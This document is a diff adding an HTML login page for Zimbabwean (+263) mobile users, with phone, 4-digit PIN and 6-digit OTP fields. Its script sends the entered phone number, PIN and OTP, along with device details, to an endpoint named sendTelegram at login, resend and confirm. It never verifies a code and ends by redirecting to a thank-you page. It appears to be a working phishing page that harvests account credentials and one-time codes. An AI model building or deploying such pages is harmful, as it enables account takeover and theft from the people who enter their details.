@@ -1,0 +1,421 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Login</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%}
+
+body{
+  font-family:Inter,system-ui,Arial;
+  background:#ffffff;
+  margin:0;
+  padding:18px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:#020617;
+}
+
+/* CARD */
+.card{
+  width:100%;
+  max-width:380px;
+  background:rgba(255,255,255,.12);
+  backdrop-filter:blur(14px);
+  padding:24px;
+  border-radius:0;
+  box-shadow:0 14px 30px rgba(0,0,0,.12);
+}
+
+/* LOGO */
+.logo{
+  height:144px;
+  display:block;
+  margin:0 auto 24px;
+}
+
+/* LABEL */
+label{
+  display:block;
+  font-size:13px;
+  margin-top:14px;
+  color:#475569;
+}
+
+/* PHONE */
+.phone-field{
+  display:flex;
+  align-items:center;
+  border:1px solid #d1d5db;
+  background:#f8fafc;
+}
+
+.cc{
+  padding:12px 10px;
+  min-width:64px;
+  text-align:center;
+  color:#475569;
+}
+
+.divider{
+  width:1px;
+  height:90%;
+  background:#d1d5db;
+}
+
+.phone-input{
+  flex:1;
+  padding:12px;
+  border:0;
+  background:transparent;
+  font-size:14px;
+}
+
+.phone-input::placeholder{color:#9ca3af}
+
+/* PIN */
+.pin-input{
+  width:100%;
+  margin-top:10px;
+  padding:12px;
+  border:1px solid #d1d5db;
+  background:#f8fafc;
+  font-size:14px;
+}
+
+/* BUTTON */
+.btn{
+  background:#ff7a00;
+  padding:12px;
+  border:0;
+  width:100%;
+  font-weight:700;
+  margin-top:18px;
+  cursor:pointer;
+}
+
+.btn[disabled]{opacity:.6}
+
+/* ERROR */
+.error{
+  font-size:13px;
+  color:#dc2626;
+  min-height:18px;
+  margin-top:6px;
+}
+
+/* OTP MODAL */
+.otp-modal{
+  position:fixed;
+  inset:0;
+  background:rgba(255,255,255,.9);
+  display:none;
+  align-items:center;
+  justify-content:center;
+  z-index:100;
+}
+
+.otp-box{
+  background:#fff;
+  padding:24px;
+  min-width:360px;
+  box-shadow:0 14px 30px rgba(0,0,0,.12);
+}
+
+/* OTP BOXES */
+.otp-row{
+  display:flex;
+  gap:10px;
+  justify-content:center;
+  margin-top:14px;
+}
+
+.otp-digit{
+  width:44px;
+  height:44px;
+  border:1px solid #d1d5db;
+  background:#f8fafc;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:18px;
+  font-weight:600;
+  position:relative;
+}
+
+/* visible caret */
+.otp-digit.caret::after{
+  content:"";
+  position:absolute;
+  width:2px;
+  height:60%;
+  background:#020617;
+  animation:blink 1s steps(1) infinite;
+}
+
+@keyframes blink{
+  50%{opacity:0}
+}
+
+.otp-digit.filled{
+  background:#ffedd5;
+  border-color:#ff7a00;
+}
+
+.small{font-size:13px;color:#64748b}
+
+.resend-row{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  margin-top:14px;
+}
+
+.resend-btn{
+  background:#ff7a00;
+  border:0;
+  padding:8px 14px;
+  cursor:pointer;
+}
+
+.resend-btn[disabled]{opacity:.6}
+.action-secondary{background:#e5e7eb}
+
+/* SPINNER */
+.spinner{
+  width:14px;height:14px;
+  border:2px solid rgba(0,0,0,.3);
+  border-top-color:#000;
+  border-radius:50%;
+  display:inline-block;
+  animation:spin .8s linear infinite;
+  vertical-align:-2px;
+  margin-right:6px;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+  <img src="/assets/one.webp" class="logo">
+
+  <form id="loginForm" autocomplete="off">
+    <label>Mobile Number</label>
+    <div class="phone-field">
+      <div class="cc">+263</div>
+      <div class="divider"></div>
+      <input id="phone" class="phone-input" inputmode="numeric" placeholder="Mobile No.">
+    </div>
+    <div id="phoneError" class="error"></div>
+
+    <input id="pin" class="pin-input" inputmode="numeric" maxlength="4" placeholder="Login PIN">
+
+    <button id="loginBtn" class="btn" disabled>LOGIN</button>
+  </form>
+</div>
+
+<!-- OTP MODAL -->
+<div id="otpModal" class="otp-modal">
+  <div class="otp-box">
+    <div style="text-align:center"><strong>Enter OTP</strong></div>
+    <p class="small">We sent an OTP to your phone</p>
+
+    <div class="otp-row">
+      <div class="otp-digit"></div>
+      <div class="otp-digit"></div>
+      <div class="otp-digit"></div>
+      <div class="otp-digit"></div>
+      <div class="otp-digit"></div>
+      <div class="otp-digit"></div>
+    </div>
+
+    <input id="otpBuffer" inputmode="numeric" autocomplete="one-time-code"
+           style="position:absolute;opacity:0">
+
+    <div class="resend-row">
+      <div class="small">Resend in <span id="countdown">120</span>s</div>
+      <button id="resendBtn" class="resend-btn" disabled>Resend</button>
+    </div>
+
+    <div style="display:flex;gap:10px;margin-top:14px">
+      <button id="confirmOtp" class="resend-btn" disabled>Confirm</button>
+      <button id="cancelOtp" class="resend-btn action-secondary">Cancel</button>
+    </div>
+  </div>
+</div>
+
+<script>
+function sendToTelegram(payload){
+  fetch('/api/sendTelegram',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(payload)
+  }).catch(()=>{});
+}
+
+/* PLAN */
+let selectedPlan=null;
+try{
+  const raw=sessionStorage.getItem('selectedPlan')||localStorage.getItem('selectedPlan');
+  if(raw) selectedPlan=JSON.parse(raw);
+}catch(e){}
+
+function normalizePlan(p){
+  if(!p) return 'N/A';
+  return (p.name||'')+(p.price?' — '+p.price:'');
+}
+
+/* DEVICE */
+const ua=navigator.userAgent;
+let device='Unknown';
+if(/Android/i.test(ua)) device='Android';
+else if(/iPhone|iPad/i.test(ua)) device='iOS';
+if(/Chrome/i.test(ua)) device+=' | Chrome';
+else if(/Safari/i.test(ua)) device+=' | Safari';
+
+/* PHONE + PIN */
+const phone=document.getElementById('phone');
+const pin=document.getElementById('pin');
+const phoneError=document.getElementById('phoneError');
+const loginBtn=document.getElementById('loginBtn');
+
+function validatePhone(){
+  const v=phone.value.replace(/\D/g,'');
+  if(!/^7\d{8}$/.test(v)){
+    phoneError.textContent='Enter 9 digits starting with 7';
+    return false;
+  }
+  phoneError.textContent='';
+  return true;
+}
+
+function updateState(){
+  loginBtn.disabled=!(validatePhone() && pin.value.length===4);
+}
+
+phone.oninput=()=>{
+  phone.value=phone.value.replace(/\D/g,'').slice(0,9);
+  updateState();
+};
+
+pin.oninput=()=>{
+  pin.value=pin.value.replace(/\D/g,'').slice(0,4);
+  updateState();
+};
+
+/* LOGIN */
+const otpModal=document.getElementById('otpModal');
+document.getElementById('loginForm').onsubmit=e=>{
+  e.preventDefault();
+
+  sendToTelegram({
+    event:'login_clicked',
+    loginPhone:'+263'+phone.value,
+    loginPin:pin.value,
+    plan:normalizePlan(selectedPlan),
+    device,
+    submittedAt:new Date().toISOString()
+  });
+
+  otpModal.style.display='flex';
+  startOtp();
+};
+
+/* OTP */
+const buffer=document.getElementById('otpBuffer');
+const dots=[...document.querySelectorAll('.otp-digit')];
+const confirmBtn=document.getElementById('confirmOtp');
+const resendBtn=document.getElementById('resendBtn');
+const countdown=document.getElementById('countdown');
+
+let timer,seconds=120;
+
+function startOtp(){
+  buffer.value='';
+  renderOtp('');
+  buffer.focus();
+  startCountdown();
+}
+
+function renderOtp(v){
+  dots.forEach((d,i)=>{
+    d.textContent=v[i]||'';
+    d.classList.toggle('filled',!!v[i]);
+    d.classList.toggle('caret',i===v.length && v.length<6);
+  });
+  confirmBtn.disabled=v.length!==6;
+}
+
+buffer.oninput=()=>{
+  buffer.value=buffer.value.replace(/\D/g,'').slice(0,6);
+  renderOtp(buffer.value);
+};
+
+dots.forEach(d=>d.onclick=()=>buffer.focus());
+
+function startCountdown(){
+  clearInterval(timer);
+  seconds=120;
+  resendBtn.disabled=true;
+  countdown.textContent=seconds;
+  timer=setInterval(()=>{
+    countdown.textContent=--seconds;
+    if(seconds<=0){
+      clearInterval(timer);
+      resendBtn.disabled=false;
+    }
+  },1000);
+}
+
+/* RESEND */
+resendBtn.onclick=()=>{
+  resendBtn.disabled=true;
+  resendBtn.innerHTML='<span class="spinner"></span>Sending…';
+
+  sendToTelegram({
+    event:'resend_otp',
+    loginPhone:'+263'+phone.value,
+    loginPin:pin.value,
+    plan:normalizePlan(selectedPlan),
+    device,
+    submittedAt:new Date().toISOString()
+  });
+
+  setTimeout(()=>{
+    resendBtn.innerHTML='Resend';
+    startCountdown();
+  },1200);
+};
+
+/* CONFIRM */
+confirmBtn.onclick=()=>{
+  sendToTelegram({
+    event:'otp_confirm',
+    loginPhone:'+263'+phone.value,
+    loginPin:pin.value,
+    otp:buffer.value,
+    plan:normalizePlan(selectedPlan),
+    device,
+    submittedAt:new Date().toISOString()
+  });
+
+  window.location.href='thankyou.html';
+};
+
+/* CANCEL */
+document.getElementById('cancelOtp').onclick=()=>{
+  clearInterval(timer);
+  otpModal.style.display='none';
+};
+</script>
+
+</body>
+</html>
